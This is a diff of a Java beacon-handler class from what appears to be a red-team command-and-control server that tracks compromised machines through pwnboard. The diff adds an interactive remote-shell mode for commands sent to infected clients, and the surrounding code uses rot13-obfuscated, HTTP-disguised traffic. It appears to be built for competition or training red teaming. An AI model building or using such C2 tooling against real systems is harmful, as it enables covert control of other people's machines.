@@ -36,6 +36,12 @@ public class BeaconClientHandler implements Runnable{
     // Object lock used to make sure that this thread is able to safetly access the duplexer
     private Object sendLock;
 
+    // Boolean to determine whether or not this client is currently in a shell, or commands are just being distributed to many clients
+    private Boolean isShell = false;
+
+    // Object Lock used for notifying when messages have been received when the client is currently being used as a shell
+    private Object shellLock;
+
     // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
     URI pwnboardUri = null;
     URL pwnboardUrl = null;
@@ -50,7 +56,7 @@ public class BeaconClientHandler implements Runnable{
      * @param beaconServer Pointer to the Becon Server that this client is associated with
      * @param os Operating System of this client
      */
-    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os){
+    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock){
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
@@ -58,6 +64,7 @@ public class BeaconClientHandler implements Runnable{
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
         this.keepAliveThread = new Thread(keepAliveClass);
+        this.shellLock = shellLock;
 
         try{
             this.pwnboardUri = new URI("https://pwnboard.win/pwn/boxaccess");
@@ -74,6 +81,9 @@ public class BeaconClientHandler implements Runnable{
         duplexer.close();
     }
 
+    protected void setIsShell(Boolean value){
+        this.isShell = value;
+    }
 
     /**
      * Encrypts/Decrypts the plain text with a simple rot13 cipher - Shifts each letter by 13 spots.
@@ -148,8 +158,10 @@ public class BeaconClientHandler implements Runnable{
     public void run(){
         // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
         keepAliveThread.start();
+        Boolean notify;
         while(sentinel){
             try{
+                notify = false;
                 String response = duplexer.receive();
                 // If sending pwnboard requests fail, this isn't really critical to javalanche's connection to the client,
                 // so we don't want to stop the main while loop, so this smaller try catch block is just for catching 
@@ -162,7 +174,20 @@ public class BeaconClientHandler implements Runnable{
                 if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                     response = encrypt(response);
                     if(!(response.equals("KEEP_ALIVE"))){
+                        // Remove the END_OF_OUTPUT part of the end of the response to the command
+                        if(response.contains(("END_OF_OUTPUT"))){
+                            response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
+                            notify = true;
+                        }
                         beaconServer.addDataToResponsesDictionaries(IPAddress, response);
+
+                        // If this client is currently being used as a shell, notify the lock so that the server knows
+                        // to return the responses immediately
+                        if(isShell && notify){
+                            synchronized(shellLock){
+                                shellLock.notify();
+                            }
+                        }
                     }
                 }
             } catch (IOException e){
